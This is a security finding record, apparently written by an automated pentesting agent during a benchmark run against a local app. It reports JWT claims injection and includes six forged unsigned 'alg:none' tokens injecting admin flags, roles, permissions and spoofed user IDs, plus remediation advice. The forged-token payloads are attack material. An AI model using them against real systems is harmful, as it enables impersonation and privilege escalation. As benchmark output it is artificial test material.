{
  "title": "JWT Claims Injection - Privilege Escalation via Arbitrary Claims",
  "severity": "CRITICAL",
  "description": "The application blindly accepts and processes any claims present in JWT tokens without validation or verification. An attacker can inject arbitrary claims into forged JWT tokens to escalate privileges, impersonate other users, or modify application state. \n\nSpecific vulnerable claims include:\n- **isMaster**: Boolean flag for privilege escalation to admin status\n- **uid**: User ID that can be spoofed for IDOR attacks and user impersonation\n- **email**: Email address that can be spoofed for identity impersonation\n- **amount**: Financial claim that can be manipulated for data tampering\n- **permissions**: Custom permission arrays that can grant unauthorized access\n- **role**: Role claims that can be injected to escalate privileges\n- Any other custom claims the backend trusts\n\nThe application does not validate that claims are trusted, expected, or have the correct data types. Claims from the JWT token are blindly accepted and processed without any server-side verification against a database or configuration whitelist. This fundamentally breaks the security model of JWT-based authentication by allowing complete manipulation of user identity, permissions, and application state.",
  "impact": "Complete privilege escalation and user impersonation. Attackers can:\n\n1. **Privilege Escalation**: Set isMaster=true to elevate to admin status and gain administrative access\n2. **User Impersonation (IDOR)**: Inject arbitrary uid values to access any user's resources\n3. **Identity Spoofing**: Forge email addresses for account takeover or phishing attacks\n4. **Financial Data Manipulation**: Inject amount claims to modify financial data\n5. **Permission Escalation**: Create fake permission arrays to enable unauthorized actions\n6. **Role Manipulation**: Inject custom role claims to escalate from user to admin/superadmin\n7. **System Compromise**: Combined with signature bypass vulnerability, attackers achieve complete system compromise\n\nThe vulnerability enables attackers to completely bypass authentication and authorization controls, granting unrestricted access to all application functionality and user data.",
  "endpoint": "http://localhost:3000/s3/",
  "evidence": "POC Test Results (pocs/poc_jwt_claims_injection_v2.sh):\n\nTest 1: Basic Authentication (Control)\n- Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJleHAiOjE3NjI1MzU5MzAsInVpZCI6IjEiLCJlbWFpbCI6InVzZXIxQGV4YW1wbGUuY29tIiwiaWF0IjoxNzYyNTMyMzMwfQ.\n- Response: HTTP 200 - Access granted ✓\n\nTest 2: Injected isMaster=true Claim\n- Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJleHAiOjE3NjI1MzU5MzAsInVpZCI6IjEiLCJlbWFpbCI6InVzZXIxQGV4YW1wbGUuY29tIiwiaXNNYXN0ZXIiOnRydWUsImlhdCI6MTc2MjUzMjMzMH0.\n- Decoded Claim: {\"isMaster\":true}\n- Response: HTTP 200 - Claim ACCEPTED ✓ VULNERABLE\n\nTest 3: Injected amount=99999 Claim (Financial Manipulation)\n- Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJleHAiOjE3NjI1MzU5MzAsInVpZCI6IjEiLCJlbWFpbCI6InVzZXIxQGV4YW1wbGUuY29tIiwiYW1vdW50Ijo5OTk5OSwiaWF0IjoxNzYyNTMyMzMwfQ.\n- Decoded Claim: {\"amount\":99999}\n- Response: HTTP 200 - Claim ACCEPTED ✓ VULNERABLE\n\nTest 4: Injected Arbitrary permissions Array Claim\n- Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJleHAiOjE3NjI1MzU5MzAsInVpZCI6IjEiLCJlbWFpbCI6InVzZXIxQGV4YW1wbGUuY29tIiwicGVybWlzc2lvbnMiOlsicmVhZCIsIndyaXRlIiwiYWRtaW4iLCJzdXBlcmFkbWluIl0sImlhdCI6MTc2MjUzMjMzMH0.\n- Decoded Claim: {\"permissions\":[\"read\",\"write\",\"admin\",\"superadmin\"]}\n- Response: HTTP 200 - Claim ACCEPTED ✓ VULNERABLE\n\nTest 5: UID Spoofing - Injected uid=7771 (Other User's ID)\n- Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJleHAiOjE3NjI1MzU5MzAsInVpZCI6Ijc3NzEiLCJlbWFpbCI6Imp1bGlhQGV4YW1wbGUuY29tIiwiaWF0IjoxNzYyNTMyMzMwfQ.\n- Decoded Claims: {\"uid\":\"7771\",\"email\":\"julia@example.com\"}\n- Response: HTTP 200 - UID spoofing ACCEPTED ✓ VULNERABLE (IDOR enabled)\n\nTest 6: Combined Claims Injection - Email Spoofing + isMaster + Superadmin Role\n- Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJleHAiOjE3NjI1MzU5MzAsInVpZCI6Ijk5OSIsImVtYWlsIjoiYWRtaW5AY29tcGFueS5jb20iLCJpc01hc3RlciI6dHJ1ZSwicm9sZSI6InN1cGVyYWRtaW4iLCJpYXQiOjE3NjI1MzIzMzB9.\n- Decoded Claims: {\"uid\":\"999\",\"email\":\"admin@company.com\",\"isMaster\":true,\"role\":\"superadmin\"}\n- Response: HTTP 200 - Combined claims ACCEPTED ✓ VULNERABLE\n\nAll test cases returned HTTP 200 with bucket listing results, confirming that:\n1. Arbitrary claims are accepted without validation\n2. Claims are processed and trusted by the backend\n3. No server-side verification is performed\n4. Attackers can inject any claims they wish",
  "pocPath": "pocs/poc_jwt_claims_injection_v2.sh",
  "remediation": "1. **Implement Claims Whitelisting**: Maintain a strict whitelist of allowed/expected claims for each JWT token type. Only process claims that are explicitly whitelisted.\n\n2. **Server-Side Claim Verification**: Never trust claims from JWT tokens. For sensitive claims (isMaster, permissions, role, amount), verify them against a server-side database or configuration rather than trusting the token.\n\n3. **Claims Validation Framework**:\n   - Validate claim data types (e.g., isMaster must be boolean)\n   - Validate claim values against expected ranges/enums\n   - Reject tokens with unknown claims\n   - Implement strict type checking for all claims\n\n4. **Sensitive Claims Handling**:\n   - isMaster flag: Query database user table, don't trust token\n   - uid claim: Verify against authenticated session/database\n   - permissions: Load from backend permission system, not token\n   - amount: Load from backend account data, not token\n   - email: Verify against user profile in database\n\n5. **Claims Validation on Every Request**: Don't just validate at login. Implement claims validation middleware that runs on every API request.\n\n6. **Clear Naming Conventions**: Use prefixes for sensitive claims (e.g., \"backend_isMaster\" instead of \"isMaster\") to make injection attempts obvious.\n\n7. **Logging and Monitoring**: Log suspicious claim values and injection attempts. Alert on:\n   - Unknown claims in tokens\n   - Mismatches between token claims and database values\n   - Suspicious claim values (e.g., isMaster=true from non-admin source)\n\n8. **Algorithm Validation**: Combine with fix for JWT Algorithm Confusion - validate algorithm is from approved list (e.g., only RS256).\n\n9. **Signature Verification**: Combine with fix for JWT Signature Bypass - always validate cryptographic signatures before processing claims.\n\n10. **Token Refresh and Rotation**: Implement short-lived tokens with refresh token rotation to limit exposure window if tokens are compromised.",
  "references": "CWE-347: Improper Verification of Cryptographic Signature, CWE-287: Improper Authentication, CWE-639: Authorization Bypass Through User-Controlled Key, OWASP A07:2021 - Identification and Authentication Failures, OWASP A01:2021 - Broken Access Control, RFC 7519 Section 4.1.4 (JWT Claims), Auth0 Security Best Practices for JWT",
  "toolCallDescription": "Document JWT Claims Injection vulnerability with working POC demonstrating privilege escalation, uid spoofing, email spoofing, and financial claim manipulation",
  "timestamp": "2025-11-07T16:19:15.070Z",
  "sessionId": "benchmark-XBEN-084-24-mhp1efma",
  "target": "./repo"
}